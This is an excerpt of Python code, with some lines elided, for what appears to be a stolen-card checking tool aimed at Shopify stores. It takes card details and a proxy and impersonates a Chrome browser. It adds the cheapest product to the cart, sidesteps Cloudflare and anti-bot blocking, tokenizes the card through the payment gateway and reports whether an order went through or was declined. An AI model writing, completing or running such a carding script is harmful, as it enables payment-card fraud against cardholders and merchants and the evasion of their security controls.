...
async def get_micro_product(session, store_url):
    """محرك صارم يسحب أرخص منتج بين 0.1 و 150 دولار فقط لتجنب العملات الفلكية"""
...
async def check_shopify_vmax(cc_info, store_url, proxy):
    try:
        ...
        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
            ...
            if not variant_id: return safe_response("No suitable product found", "-", "Shopify Engine")

            # 2. Add to Cart (Strict Verification)
            res_add = await session.post(f"{store_url}/cart/add.js", data={"id": variant_id, "quantity": "1"}, headers={"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})
            if "item" not in res_add.text.lower() and "quantity" not in res_add.text.lower():
                return safe_response("Cart Add Blocked by Anti-Bot", price, "Shopify Engine")

            await asyncio.sleep(0.5)

            # 3. Form Submit to Checkout (The ultimate bypass for CF Direct GET block)
            chk_headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": f"{store_url}/cart", "Upgrade-Insecure-Requests": "1"}
            ...
            # 4. Deep Diagnostics
            if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower(): return safe_response("Cloudflare WAF Blocked Proxy", price, "Shopify Engine")
            if "/cart" in final_url and "/checkout" not in final_url: return safe_response("Redirected to Cart (Anti-Bot removed item)", price, "Shopify Engine")
            ...
            if not is_graphql and not classic_token:
                ...
                return safe_response(f"Token Missing (Page: {page_title[:15]})", price, "Shopify Engine")

            # 6. Secure PCI Tokenization
            ...
            if res_pci.status_code != 200: return safe_response("Stripe Gateway Blocked IP", price, "Shopify Engine")
            ...
            if is_graphql:
                ...
                return safe_response("Timeout", price, "Shopify (GQL)")
            else:
                ...
                if "thank you" in res_text or "order completed" in res_text: return safe_response("Order completed 💎", price, "Shopify (Classic)")
                    ...
                    return safe_response(err.group(1).strip() if err else "Declined / Custom Gate", price, "Shopify (Classic)")
